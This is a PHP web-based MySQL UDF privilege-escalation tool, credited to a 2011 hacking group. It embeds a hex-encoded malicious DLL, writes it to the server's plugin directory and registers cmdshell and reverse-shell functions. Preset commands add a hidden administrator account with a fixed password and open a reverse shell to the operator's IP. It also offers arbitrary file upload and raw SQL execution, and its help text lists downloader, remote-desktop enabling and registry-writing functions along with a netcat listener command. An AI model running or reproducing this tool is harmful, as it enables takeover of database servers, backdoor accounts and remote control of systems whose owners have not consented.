<?php
if (get_magic_quotes_gpc()) { 
function stripslashes_deep($value) 
{ 
$value = is_array($value) ? 
array_map('stripslashes_deep', $value) : 
stripslashes($value); 

return $value; 
} 

$_POST = array_map('stripslashes_deep', $_POST); 
$_GET = array_map('stripslashes_deep', $_GET); 
$_COOKIE = array_map('stripslashes_deep', $_COOKIE); 
$_REQUEST = array_map('stripslashes_deep', $_REQUEST); 
} 

session_start();
if($_GET['action']=='logout'){
foreach($_COOKIE["connect"] as $key=>$value){
setcookie("connect[$key]","",time()-1);
}
header("Location:".$_SERVER["SCRIPT_NAME"]);
}
if(!empty($_POST['submit'])){
setcookie("connect");
setcookie("connect[host]",$_POST['host']);
setcookie("connect[name]",$_POST['name']);
setcookie("connect[pass]",$_POST['pass']);
setcookie("connect[dbname]",$_POST['dbname']);
echo "<script>location.href='?action=connect'</script>";
}

/*
foreach($_COOKIE["connect"] as $key=>$value){
echo $key.":".$value."<br>";
}
*/

if(empty($_GET["action"])){
?>
<form name="form1" method="post" action="?action=connect">
  <div align="center">
    <table width="294" height="140" border="1" cellpadding="1" cellspacing="5">
        <caption>
   					<h5>基友菊花爆必备神器->MYSQL高版本提权工具</h5>
		</caption>
      <tr>
        <td width="66">host:</td>
        <td width="270"><input name="host" type="text" id="host" size="34"></td>
      </tr>
      <tr>
        <td>name:</td>
        <td><input name="name" type="text" id="name" size="34"></td>
      </tr>
      <tr>
        <td>pass:</td>
        <td><input name="pass" type="text" id="pass" size="34"></td>
      </tr>
      <tr>
        <td>dbname:</td>
        <td><input name="dbname" type="text" id="dbname" size="34"></td>
      </tr>
      <tr>
        <td colspan="2"><div align="center">
          <input type="submit" name="submit" value="提交">
		  &nbsp;
          <input type="reset" name="Submit" value="重置">
        </div></td>
      </tr>
    </table>
  </div>
</form>
<div align="center"><strong>Copyright By Dark'mOon 2011</strong><br>
Blog:<a href="http://www.moonhack.org" target="_blank">www.moonhack.org</a> Bbs:<a href="http://www.90sec.org" target="_blank">www.90sec.org</a>
<a href="http://www.moonhack.org" target="_blank">版本更新</a>
</div>


  <?php
exit;
}


$link=@mysql_connect($_COOKIE["connect"]["host"],$_COOKIE["connect"]["name"],$_COOKIE["connect"]["pass"]);
if(!$link){
echo "连接失败.".mysql_error()."<a href='javascript:history.back()'>返回重填</a></script>";
exit;
}else{
echo "连接成功<br>";
$str=mysql_get_server_info();
echo 'MYSQL版本:'.$str."<br>";
echo "<hr>";
if($str[2]>=1){
$sql="SHOW VARIABLES LIKE '%plugin_dir%'";
$row=mysql_query($sql);
$rows=mysql_fetch_row($row);
$pa=str_replace('\\','/',$rows[1]);
$path=$_SESSION['path']=$pa."/moonudf.dll";

}else{
$path=$_SESSION['path']='C:/WINDOWS/moonudf.dll';
}
}

$conn=mysql_select_db($_COOKIE["connect"]["dbname"],$link);
if(!$conn){
echo "数据不存在.".mysql_error()."<a href='javascript:history.back()'>返回重填</a></script>";
exit;
}else{
echo "数据库--".$_COOKIE['connect']['dbname']."--存在<br>";
}
echo '<a href="?action=logout">点击退出</a>';


echo '<form action="" method="post" enctype="multipart/form-data" name="form1">';
echo  '<table width="297" height="53" border="1">';
echo    '<tr>';
echo      '<td colspan="2">当前路径:';      
echo      "<input name='p' type='text' size='27' value='".dirname(__FILE__)."\'></td>";
echo    '</tr>';
echo    '<tr>';
echo     '<td width="235"><input type="file" name="file"></td>';
echo      '<td width="46"><input type="submit" name="subfile" value="上传文件"></td>';
echo    '</tr>';
echo  '</table>';
echo'</form>';
if($_POST['subfile']){
$upfile=$_POST['p'].$_FILES['file']['name'];

if(is_uploaded_file($_FILES['file']['tmp_name']))
			{
if(!move_uploaded_file($_FILES['file']['tmp_name'],$upfile)){
echo '上传失败';
}else{
echo '上传成功,路径为'.$upfile;
	  }

			}

					}
echo '<hr>';
echo '<form action="?action=dll" method="post"/>';
echo '<table cellpadding="1" cellspacing="2">';
echo '<tr><td>路径目录为</td></tr>';
echo "<tr><td><input type='text' name='dll' size='40' value='$path'/></td>";
echo '<td><input type="submit" name="subudf" value="导出udf"/></td></tr>';
echo '</table>';
echo '</form>'; 
echo '<hr>';
if($_POST['subudf']){
mysql_query('DROP TABLE Temp_udf');
$query=mysql_query('CREATE TABLE Temp_udf(udf BLOB);');
if(!$query){
echo '创建临时表Temp_udf失败请查看失败内容'.mysql_error();
}else{
$shellcode=udfcode();
$query="INSERT into Temp_udf values (CONVERT($shellcode,CHAR));";
if(!mysql_query($query)){
echo 'udf插入失败请查看失败内容'.mysql_error();
}else{
$query="SELECT udf FROM Temp_udf INTO DUMPFILE '".$path."';" ;
if(!mysql_query($query)){
echo 'udf导出失败请查看失败内容'.mysql_error();
}else{
mysql_query('DROP TABLE Temp_udf');
echo '导出成功';
}
}
}
}


echo '<form name="form2" method="post" action="">';
echo  '<table width="300" height="59" border="1.2" cellpadding="0" cellspacing="1">';
echo    '<tr>';
echo      '<td width="83">文件路径:</td>';
echo      '<td width="201"><input name="diy" type="text" id="diy" size="27"></td>';
echo    '</tr>';
echo    '<tr>';
echo      '<td>目标路径:</td>';
echo      '<td><input name="diypath" type="text" id="diypath" size="27" value="C:/WINDOWS/diy.dll"></td>';
echo    '</tr>';
echo    '<tr>';
echo      '<td colspan="2">';
        
echo        '<div align="right">';
echo          '<input type="submit" name="Submit2" value="自定义导出">';
echo      '</div></td></tr>';
echo '</table>';
echo '</form>';

if(!empty($_POST['diy'])){
$diy=str_replace('\\','/',$_POST['diy']);
$diypath=str_replace('\\','/',$_POST['diypath']);
mysql_query('DROP TABLE diy_dll');
$s='create table diy_dll (cmd LONGBLOB)';
if(!mysql_query($s)){
echo '创建diy_dll表失败'.mysql_error();
}else{
$s="insert into diy_dll (cmd) values (hex(load_file('$diy')))";
if(!mysql_query($s)){
echo "插入自定义文件失败".mysql_error();
}else{
$s="SELECT unhex(cmd) FROM diy_dll INTO DUMPFILE '$diypath'";
if(!mysql_query($s)){
echo "导出自定义dll出错".mysql_error();
}else{
mysql_query('DROP TABLE diy_dll');
echo "成功出自定义dll<br>";
}

}

}

}
echo "<hr>";
echo '自带命令:<br>';
echo '<form action="" method="post">';
echo '<select name="mysql">';
echo '<option value="create function cmdshell returns string soname \'moonudf.dll\'">创建cmdshell</option>';
echo '<option value="select cmdshell(\'net user $darkmoon 123456 /add & net localgroup administrators $darkmoon /add\')">添加超级管理员</option>';
echo '<option value="select cmdshell(\'net user\')">查看用户</option>';
echo '<option value="select cmdshell(\'netstat -an\')">查看端口</option>';
echo '<option value="select name from mysql.func">查看创建函数</option>';
echo '<option value="delete from mysql.func where name=\'cmdshell\'">删除cmdshell</option>';
echo '<option value="create function backshell returns string soname \'moonudf.dll\'">创建反弹函数</option>';
echo '<option value="select backshell(\''.$_SERVER["REMOTE_ADDR"].'\',12345)">执行反弹</option>';
echo '<option value="delete from mysql.func where name=\'backshell\'">删除backshell</option>';
echo '</select>';
echo '<input type="submit" value="提交" />';
echo '</form>';


echo '<form action="?action=sql" method="post">';
echo '自定义SQL语句:<br>';
echo '<textarea name="mysql" cols="40" rows="6"></textarea>';
echo '<input type="submit" value="执行" />';
echo '</form>';

echo "回显结果:<br>";
echo '<textarea cols="50" rows="10" id="contactus" name="contactus">';
if(!empty($_POST['mysql'])){
echo "SQL语句:".$sql=$_POST['mysql']."\r\n";
$sql=mysql_query($sql) or die(mysql_error());
while($rows=@mysql_fetch_row($sql)){
foreach($rows as $value){
echo $value;
}
}

}

echo '</textarea><br>';
echo '<hr>';
print("
功能说明：<br>
MYSQL=>5.1<br>
自动获取高版本mysql调用函数路径（测试mysql5.5）<br>
MYSQL<=5.0默认为系统目录<br>
自定义导出dll <br>
默认udf自带函数<br>
cmdshell 执行cmd;<br>
downloader 下载者,到网上下载指定文件并保存到指定目录;<br>
open3389 通用开3389终端服务,可指定端口(不改端口无需重启);<br>
backshell 反弹Shell;<br>
ProcessView 枚举系统进程;<br>
KillProcess 终止指定进程;<br>
regread 读注册表;<br>
regwrite 写注册表;<br>
shut 关机,注销,重启;<br>
about 说明与帮助函数;<br>
默认添加管理员账号$darkmoon 密码123456<br>
默认反弹端口12345<br>
不要随便删除刚创建的函数 重新生效要mysql重启<br>
别人的udf 请自行看别人的udf说明<br>
常用命令<br>
create function cmdshell returns string soname 'moonudf.dll'<br>
select cmdshell('命令')<br>
select backshell('你的ip',12345)<br>
nc -l -p 12345
");
function udfcode(){

return "0x4d5a4b45524e454c33322e444c4c00004c6f61644c696272617279410000000047657450726f63416464726573730000557061636b42794477696e6740000000504500004c010200000000000000000000000000e0000e210b0100360090000000100100000000003d9502000010000000a00000000000100010000000020000040000000000000004000000000000000010030000020000000000000200000000001000001000000000100000100000000000001000000009980200dd020000f19702001400000000c001009000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002e557061636b000000b00100001000000000000000000000000000000000000000000000600000e02e727372630000000050010000c00100e6da000000020000000000000000000000000000600000e088010010e89a02101b0000000e000000001000106b970210b7970210ba970210c8970210a3970210fc0f0010de960210e0960210809502101dba0110ed970210ffaf0110d2960210000400007c070000c40b0000b30200006604000090c0011000000000ffffffff01000000010000000100000001000000000000000000000000000000010000008800008018000080000000000000000000000000000002006500000038000080660000006000008000000000000000000000000000000100040800005000000090000100004400000000000000000000000000000000000000000000000001000408000078000000904401005c3c000000000000000000000300420049004e00459398edb4853493541907b2de1fcbd640cd0773df2017d5f39748433f6d90c556f2b1c13f1be3bcb417f756a33186e453b17faf31e8157911b03da9aaf41f2277afffec07571bfae8214b0ff18af2f7c0ad2d95a1ff0f487658e587923bc1ce9d2c2698c74b940c5842bf55c7da2026563c174c45c6c5e08e95b030390ef0886bd124043aed5b1631b138955065fa05fbfcc1c0b81636c51c7f18bccc846ac8305f5c5134fd92a3e9cb2bb5d99ee1e21a6f5d2929597c59b61e8925c1675138746f1f549d1b8a0c35b7dab30b46a401737162d316fb50723e8a98ca5d6d298259015fe6e1c0a402790e15a965807b488c73e6915ffd6e57d333c0d86ef3a562e0bf0bccbe4bc7ccb560bc2df75d593904f638eae6a964c33f4e123a1d3c213b184373bf34c66ed68b368316156e32f6fa63e02add3b03893f73af8abd1099c48c1d0c886314167008ef255d5c2c3539fb781d6d39aa432d654c702f15df0a339530889adfefde4b9df29d2e8fa7e4317fda1b0588a22265eb53c317bc6ea94fa1981968d5a60921ff60f9e9559123aeaa8d1e91e38fb1a2fb1d2075454e8ef226538ed8307db2c99cd396b5c6da829569c3875f317a4bff429b0528d204af4284fc05207901d48e52b386e5d44c69a2e8e3086f137f1d0694ecd619ecc97af83a97d5a0598701b386bd704864c72b3858824fc94082da933d5fadb23ef3dee6528cd4cb2eefe2f2b03d17857940d70222d541b2523f4e7d5b8ee46caba89830d664defb08f798e83818cde2701b8c5d37fc6c5c045ae468efca8b8d5b62b60811c21dae6b86deffa3824e7581435c0bc67555c2d498047554b52d0bfc909911e94ce5d6d3a72659b0ee25f2b40be7d239115256d8c2687afc7e075a2557f974d9130d76e09955235ed4afbc03891d8cc489c8a6f0aa00cfa41ceffd29df70edd17679477c4edd29023c807a55e8dfe614fefe44ad759cfca628d9da21b68e2d6a7ab33d62b175fb858c94158923278f256e96eff885e3eafa12b09ecabfa54d523a3c33270510fd821a0f56e24d3bfaa815a6bd4e2eba52e52a940037728e2cbcd8278fe714384a4bfc887797b071bb440b010a9d0db60cbacee05907b7b08e20dba7f45ffd21265bc47086f8275c1c5071afaeb7ce0336e0a5facf0a7923597c7f4ee7b54512b38608c8ce06acd05cfcdd68ec58f288889ef615623409bc88dd3b09b8be22fcc199755426b4b0704ec21ae1a3e7efe21cf6952456f3743d8d76e1d02e7f7815ea30feb20f279fa9cf827d7618c1c182be35a5ab2eb9f611057b493eff526a75513347a1dce859f1d8d5cc9e842f55f82211b2fa26ce53c5f133afd31531c50324a5429b74fab0746eed031acb0d02344e1b495bca244ae6eba4dcd3da28419a064c22e895880fd2485c3e6861b6e06a4e43959b9d0633774ea85692b12408f6867903f8b9bf790973680440d4822238690617af451d0eebf942d4c98637e9ba092b38dcdc608f330722cc255a4feb5d2a3cb268518ebf43231d9630ac95ae22ff0b8640335febcaf6a3066be83f03673636639e7cb025963d4071886ef072bf9f6f5ad0e0a407734b77320cb1fc6a6a07d14d36403ac1b849eba998b5f64d59ecfa4e30200d84d236a12b1b11acae3e4d74ca5368657f93b4d80cc5356c5537ffab7d3f792a03912a01d94c03f4f097824586708ecc7cbd1db4b7e24a0f2e45121629b9c2bc92716b790246c4a4159fd9e4958fc13a4a72c1d799078d601f3eba6457ae19a68877841d343175f3b692ec219c3a059931421596335af3121670ef9602fce94de822922d7f1c357f7719b2a63de4a0c9b648297326b5a32082462e6bd83457f5c415a418209b4deecbb66f26383d9244f08e0aee60659808dbd2a4744865f6b6a0950ed88138a0c6496245c84d60caabef5facc467f114dd3b695e39fb076887147be54b8ff924aad0e159f4da839d7b67ea764b3e5906ad36bc3c476584bb38b7f009cedab0e6d89bb9ec76e3228e559b69c763bcbe2804dfbc4c6eba24173214dd72f455eaf170e5afc8b7a1ffac801dcd05a53aaef649f67f1d11cf249cdcf2e33a7d93e872d323a836a78be609996b592f3bb5fd8f6b952fd09d66647dcc055aa681b8af88597d510daae5255d2318b9b5e116b83b06c8a644010d677c683684abd9b677ac444ec7163218e4708336b0d12bbb660fe9bc21e49d2efc76d74e26c71d6c945267fd7d664fe5385abc834f661fe715b0924e9c63f5f6c88cb0ee11b44393a9113f6c17d56bd982a00cd4811653669c3a1b9535260742017659cf380fbf76ae37b92863bc94923f3990658db72c9c64bc29d4c2c03ec0c1c74e3558f66092c1d78d710d52a2c96cc6cad8729d9385016b36c9d231986cb60e8cfeb37aacf1205b9cbad985834c8b4b9d435e17dbc94967b5eb3e32e2a0423744951b1a087d85a822663de7a3f9c2253f7366d02e161b9b3a18fdee2946d741d3f2a5b0d0f3217e54d9cc97c8a62abca1b114240cce3576a7131069751af5a280721df185caace01a618f57cd8dc52e03a85048adb2d6f31d9d136817602ee2c38f694e6cb9eb2e830abf46b8a2f4ecf4fbd190e357d774e1dbe9de09650ea97486d41bb406c36d07dfa66c8347720158494c21ef841d6219aa0d3c8dd1cd33c3734e49ee574928bb0b1b28f86f0eced7c8fc50e93868455d6419ed7bffe464315490de54ab89437cd6f9f2e71fd59e4c5863ec3f83e4760edc9bc51a9c55a4b253c7966eb110259221449c131b3b328630ea1da1d8553d05fe6830902950a48d623396edd5280a1bbb165d1eab1a77f157d1b7870c4411850752bab0b6fb688d268901c2d8e456e3ee0614d1dd30a138f33661268fd83eb720f5953c280949f7760372ddfbcfd9fa54ced88fe574da013246aeea3bd41b72c6dbf603adcc21e5b7de44345d2a972ec002761a886b55579b8ff13286f668504c3290d15dbef81b1e96ad946a6466b7128d0ac11fb7fad4fe60b6c70e687c5665827a1ded9326f329c3dacb0dbd25ac1adcdc3eccab7d97db8c55b96afd5504bde724ca1489ef6108b25da9555f78111a6a04c30ae62961ade9cb8c02be27ba9984c0104ab80376719a08047d821b0bf60e1a29a6d7d377760b053ae91bf8057156e5b593a7dc8058f05e2da4ca217cf5be8881e00fa9d1f7a618820a0f0b2ba6175dbca0b6f035bc24ebe83198b5a90ebde91e8954581da67159639f40f37210a1bd8bf14dc987fd37b1a5fe69bda234e6d7f70d9ca0531039f19fd054904eea5b7a52ec468e5345437d0737b1495dc7249ea4cfa6f48c2e3e6158d5f0f1efd1bafb4d7fe0b0dce7ad98e8d3f57bb708a8aea83a0eea3ddc00394dfcdfafd308b6b24fa20c7625d2fcd6a5fae7d273ec98eea794bfe979dc3123ffc32c197bdca6321b57785908e6d19ab6f536a8df7e1e05baded7a4ebc007766c508a13394f51803beea47fac0ed97c25ed9888ddc6dc6219e704c6a132cd04cff7447b2df742108d0272366b11b2c4767464b460251de4ce3ce6d193589d14aec9b97766a6883e4dbf1dca0edf32f8980ebf2f9c935dcc56fa6e0b29798ea458e6edc0af271e6814fa425548e41fc8f641b8ad487a20812e4eb25063746b3d4244b101031580a0119d649ca5f32a68b11e7d5741a5ad7682fa8fafbe5aff113269b9a47923f81d3a028615f8c6e7b38e78e443cb2a49d91c2a7757a99df35aaa71dfd21e0b5591af970e6d2f239ff7e2d76acd9967ad6fc30d460d552f1930461e9b86a92d358618fa3b539029603a3260fc65d57a5909e35777a633d9093911fc636bfe3745a7510cb4633092223f5315f6745a604ac0365abae8968b19677f840b1502e21b638ceffd5075b3d3688eab91379dfeed65beaa5f7ca5b971dbc53c6c000b259dea5d6fd84b2e12090331a45299d807d3c12545f84710d36168ca4f277c8fa3982806faef71d73860b58f8db7a3116af13418100c8e905651b538b5c1853fb194c574a918b8f0426152253ff3db5af8289080fe0d7bf2b9d907c54eb2604d8f4e3865d8c7e8659acd1928182206c0efad42664b6ef473f74d7a8d681273590a487f250c143bd18253c3df904b620f4203757b029d8b41bfbcb9ace3d5e7673386dab5e3e486a3f49bbf89f5a4c67e0c1067c0adf6bbdfa43cd6289c1e45e46fc4f236a708684f9461787a90f6fd9a1f55690bbb3ddfcb94d960c39f58110acd1a4538b6ae85b06e4024610575bc3069a2b90b07e01096854e1e8bd00260bd495f975c8543030031c6fbcd201bf384f27f72af8c9ce354ef66a27fbc04dc0bb34f7a67518575d78bcac95243f1743b0f843f7806d1b6278766e05e90694a328230b378516ece63e46180a0c2d3972674fa8de29c864198e66173bea93f54995bfaa4b1e8638ba111187e26161d23ddbaff9a1dde6c8601b6c1c5e0658a153685de38e7a92a39d34587d67d10da2d7a01e70ac5488b16d0002229154101f0d5f6afd6636f7e376a3d5842861f8c5642b81676a5a3dc14de9bfe1e3011cb9e4cdd6a1afa87e84f86ee792a090f48f9540a23eb0928cf8d9f52a44acba76c827494bb6ef8971f1690d441f0ba8322b5cb15ee105e95ab47f560ecef4d5046c75ded3523549b3a2a0c878906af9ef17bddb57d82a437932d9b6802cf178e34f9c4764054f01902258e7d2317b9a98e78bc273e406d6fd2d33c4270cfd4596fedec01c4f9e6216f73a71e930b208d247dceee69f0d1f55a179c70b69f71c0e8a8b4cfdd89cdb1908d6d96b33d98a26456f79f26c744f9f7508983324cc354c1f20f89480c8c506fa04f59cb8ae99f8bf4ae9ba8b06f6aa052b695aa5da8143eefda5b3a4d65b0333f944861d2d53503236151731f4b262d66597865ffebc3474f3566b56f4ba520e9fd933c304ef9ca43bd6336e9b82e0e76724c1820aa1bc231ae694cf759938c29c210cb676885a65b4ae212f4382788458ea9a136bfc9bfed6f159e0844c4db54a3bac68d95cc91623f7e1476f8f736c131097daf671157f18d67116a2d273fa9e53375955bb7bb6ecb3518e7f05dd9248a1e26607708ab2a67904c44325fbe219e04512da82e93d466fa33a7d00d70d1cd45d650f3bf001bd7a2d0ae1c545fb75fb6af69bbde85e358e272b26dd2ea189db0a41c1131ec3882d5b72e3a643e02527909758ba4bd542746b60d822b35884b828a12b683aa4abd4861f7a249bbc0dbc12559e88c2bce5bf5aa35c0b17c69794abbc5765e7eabca36ebfb7318998f974d42f3df2564e29abe38e7671d25702051346b86fa36f6b71dae27e7506e5a5a790658646ab672bb825857890107e837992ab33ad751963c155d5d85dbca61092accb9e38c4589db3487082068f2dfc818fe05f8ce8a18dfc6716e0466e87d79ad6bf1353b0a34be96416d0f44c44a9563fdbc2c093875a385ecfdc6e11a488964690333669e8dc714957e0e1b3ce29c2309bd17ccc74520cda658381385821f44137a3486a682fcefc2e111d8304264538a64e8acb6e791960342463f970c4d250e154f28b66a5a7011bf7942c04e053804c100e79a1cbc4278f689ab9a3bd4669928bcad4c165644b53695fc7910a2129a872e548de830ef3b7ee255e7b6480f06f9fd895e84e5b5e038ffc0389317e95a79dbe8c95c8b8bcaef5a524abd85da966e905d2db3946d56eee8f5006ce54eea02c035af841bdcf95509422fc24329e6a03bf6eafbefe5b6ffe19f45a63ceb73ef8bcb0ea9e3030d27c3d6a8ddd88b041dc47fb229431498262a8887785dd8657c055229dad916a71360aa931bd7e158b6c17e3a2d8cefd88f77e40ebbcfa4db96b89d6f51402d7e325a8e64fe1fab085568dc5f373bce2bd05b24eb60f87214fa162086d5521d39ee0eb565f86f338ff996e3fcf4a9dc36f3a32cdcc356eff69cc0f5bacea0f331494796d808168b83eeb8489c0f687052c709e7558005e7d34aa60424265cc8a656d065ca83b78ed51d0a2a6f1768c3048ade80275469ca6091a5720d56e36c1c5dc0f6fa344259d34c2324821ede5ce0ddf1b9d9132270a6c2ace863d258b5377f3dabd660a0c4d59278fa23f056d76b077812e7db036500bdd1bb333043ff1aa5267ed828ee5af9e4cdbdeea851f3234f93700e681f13b5eacb938e03851d4e80f319d5dc8e6439fa41475d6f133d131cebefe4db7f3a7c0b9d62511805373e2a5ccb637b81fd27fddf03eb72d74bf20b54e00a501acf1a61aba9d994055402d838b85930912630335e5b545c0058d9474e5ac355a5f630f8ae6e3860bf8a62798926179a3bc9c2e7264752ea7a0b45bb6053169504510e70a043d3efdc5af76a2e1df04c2a2b7cf96dff5e8f212510d9dfec01b425107c9c8fa7500637a27eff7bb7eb7935566bfaf5d37323def1740318875ba2e0cea9dd3ae9ab7d0bf74ad9fb7c87c91a62aafd80b8661f28d5148d92a4f8f80167b786751a40edca8b3de8c2bb05c7cd682865ac3493377cba23a4e1fea18299336e7533e38af3598acde9646c1d6164b3fa8059aaa522824f6ffb90c12b4827d0e0302153f2126201bb6b588875cab0d346a7dc8749654f503f01bd9a4e672a88104829417bfd2e344b435fd111ce7ff27b56c81b44c487df01e63f0ba70228ad76fa2b4e0d5a57d7f63827afc2328a3f6b679eb581c9247689baf8057fc892bf5b323f19091b085bfd1625d7458d8a8a8ba3248fe992fe9edb14dafe34355234271d9ceaf4e9e298c02743be6b5488a8e248baae788e793301078ebc3824424374a0624404d6ce2d268fcf0052a20125e71295eea2b0c395ecb2f4bc20efd7270e4b00f2a17de04a587c4e17bdbb07713f830be090c4200db5477f75e44c9714d4eee288e438fd3c6887e5b08ba6f2f015dc749871fed99ac7bb5d25de80ff396f0139c1a98ecf25971383068cd71083d9a3d11f73860372efeb266da459d9e3f49d7c6a47e034ba7d97142cc6183bdcd38b0881ae18061070e767f68835d8e51dd585dbb6597b8e66ea60a553d876bd355b83d2c1340385ecfacda26d65c744aa6d025dd393ec353778c0c24df4abce8f96006856ce322cc902aed08ad19ec4c01ea392ddd15ea0b6f25fab35cc314169c440e9552e5dcfbf02a7eb924c8f40e7299245d550ced955f57dda2b95770de0f80041384f26f075cf4eeb0b893f5a3844e9779b5ed0c83810f6ff31836f6c289a7bdfc95e9d452f931e6dad9252d97220485e59aea90fa8df84b17e993f1627ac66a7ce4920eb63fd7f27b0969e7e19fb83f8252623818cd78ca73414cbb5be0f242ed5fbe337fafb88cc3d203b5cbc73daef664635f7c9db24a6a7795ab7f2fec1d47cda394ca4367013911174e0a7949c6a8993483c76891b248803a5be67deed96cf301a14ab61246be742eb8e3a09d3c619ad9f3320ff53b99c2b6b2f41b009d629ce0df2494836158fbe4bf7e3460d88cb212c99a4decf3f9ccec071f494269d7bd570b5ea0fca07485e5326a4a6727e7e0c101375e4239535ee6b0d63a20c3c9bfc5d0dd9940348c3421673039371ae3074698e7167c70fc635ecb2daa207aaf4570043f2dadb1af007b930d979cc0da729baff0e077df062ad3f2bcbd4e9daebd96f90fe9946cd88eee0d72a9ed035af0bfceb843a2399468088a24d8b999403438fc99f0da8e4a91a939953ffaf7251ca3fd466ff2110afb33242e278c6b072f5ed3df4c1482d28722874f0b1f30226bf336699766333dc331abf7ec09466be15eceaa2bc8d6b21ba56d5e960b7b485466ac92f03b3ae98bdc441686e2d89975756dd922bde9f8760c6a9a21e046d9f38ad2477e5c11e306b7f335eb5bdc198c28a28139b4944f43cd22b6798e89ed772271a43f1c802db013d047977dfd98361a4ee89186dbfe61fbfa02432ac4645f0ded7e6ec07e82f102922c1917082529e3a364b43196e93c1ec6353a0f972165d63b2086e43d31c21e28136e72f338ffeea68bca8490d58227d435dcd2defed8ca49cf486ab29b7e776220e66c20636f1f551d54bae83b4996ec68d656f1a29b82d806f5498f29178f503919d517835f289d4b5f679d61c4f91522ed8ab502b544346ed3b3c2fc949a149a24a703aa524a38a233323a02fe5fd220884d708999f227cc27f800b6b00c4cae107def5b0cb9ca4336875662af9622231b38521463432c4b7ef837569efbad1fb7d6ca953e28d1d0e520b0c98fd74a424a6c06d41a60d7cd6e8ee721847acf03f996c371c321a83bf15d37c72aaa44b51bf5a7e8caf1c3787eee48aaf372f010931cff21682968b2033bf4809203203ec61566f96fcd2acd00172d91e9bfb5b8025652263281d985b316040ddef4aeac0f8e3542b41b76ff98b5d0303854aaa254c3a841867bb25c65fcbc2271814b525be74b3401b240fe5fa3ab12175af55366c7a839fa2c7ff59f85bf0b51943df5c12537ca78ae77c176c5e4002a87893a62c256f0c4f86778e4e059c0aa20e75bfc5c2835f4df0fcd7ac1171f49a8ce39ec5b6a2f69b995997dc62f7638c6e379846045e4a6ee0c1dfd162e2655b45769fa10e87bfd6b4a488477dd4f8e70cdbdbeeff66daa8715f286ac7a73506871cc21e4f7ef300b6c295c78c1b3e5d6031d7fb3be5b5635bdb92bf94c3f4e4335724182facaa37c5d65ff165913ff61cd8971d178a62444e45d6c92b19bc9a1b21febe3715a1f9f916aaab25910986da22c736954bfbf8b0c0281b1ef97b9851b12ff39d1ad97dbecde06fb708a588f4bc99dc5d52f1ab87407b40c1e06d23761e354a2dfde9324f64b7d3391c5d2857904a12965011bd2d1f5d6e5fadc4d4acd5605167f10172dfbdf466ef9f34fd1b5b290d426bb3c4c812de12616016c6dfed62615f522342a1157218cc54ecb2874a3fff11d97810c5d667413cf74008b6ba55cf547d7ad1e10930da17f15a7b9979dcdec0191f00fecc45a8321f0ec2c4c2abc963f8bdf34f3d05b8db7591880c0e36ea294ca4e483be57094addbf9edae51f8b0c97bf47861304e7